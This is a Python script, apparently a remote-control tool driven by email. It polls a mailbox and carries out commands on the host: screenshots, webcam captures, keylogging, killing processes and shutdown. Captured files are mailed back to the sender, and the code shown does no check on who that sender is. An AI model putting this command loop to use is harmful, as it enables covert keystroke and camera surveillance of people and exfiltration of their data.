import mail_handle_receive
import mail_handle_send
import system_control
import datetime
import keylogr
import resource_monitor
import time
import re
import os
import multiprocessing


def shutdown():
    print("Shutting down in 10 seconds")
    system_control.countdown(10)
    os.system("shutdown -s -t 0")


def help():
    pass


function_map = {
    'help': help,
    'shutdown': shutdown,
    'screenshot': system_control.screenshot,
    'webcam': system_control.webcam_image,
    # 'list_apps': resource_monitor.list_apps,
    # 'open_app': resource_monitor.open_app,
    # 'close_app': resource_monitor.close_app,
    'list_processes': resource_monitor.list_processes,
    'kill_process': resource_monitor.kill_process,
    'keylog': keylogr.keylog
}


def request_handle(msg_list):
    if msg_list == None:
        return
    for msg in msg_list:
        recipient_mail = re.search(r'[\w\.-]+@[\w\.-]+', msg['From']).group()
        cmd_list = mail_handle_receive.decode_mail(msg)

        for cmd in cmd_list:
            try:
                cmd = cmd.lower().strip()
                if cmd == 'screenshot' or cmd == 'keylog' or cmd == 'webcam':
                    filename = function_map[cmd](15)
                    print('Saved to', filename)
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd, filename)
                elif cmd == 'shutdown':
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd)
                    function_map[cmd]()
                elif 'kill_process' in cmd:
                    pid_match = re.search(r'\d+', cmd)
                    pid = pid_match.group()
                    function_map[cmd.split(' ')[0]](int(pid))
                else:
                    function_map[cmd]()
                    mail_handle_send.send_mail_success_execution(
                        recipient_mail, cmd)
            except Exception as e:
                print(e)
                mail_handle_send.send_mail_failure_execution(
                    recipient_mail, cmd)


def waiting(message):
    print('', end='\r')
    # icon = ['◢', '◣', '◤', '◥']
    icon = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
    n = len(icon)
    for i in range(n):
        print(f'{message} {icon[i]}', end='\r')
        time.sleep(0.2)
    for i in range(n):
        print(f'{message} {icon[n-1-i]}', end='\r')
        time.sleep(0.2)


def main():
    mail = mail_handle_receive.login()
    while True:
        msg_list = mail_handle_receive.get_mail_object(mail)
        if msg_list == None:
            waiting('Waiting for command')
        else:
            now = datetime.datetime.now()
            timestamp = '\n> > > >[ '+now.strftime("%H:%M:%S") + ' ]< < < <\n'
            print(timestamp)
            request_handle(msg_list)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExited")
        os.system("pause")
